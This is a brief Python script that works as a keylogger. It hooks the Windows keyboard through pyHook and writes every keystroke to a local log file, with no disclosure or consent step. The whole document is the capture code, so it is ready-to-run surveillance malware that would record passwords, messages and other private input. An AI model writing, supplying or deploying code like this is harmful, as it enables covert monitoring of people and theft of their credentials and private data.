import pyHook,pythoncom,sys,logging
file_log="D:\important\log.txt"
def onkeyboardevent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onkeyboardevent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


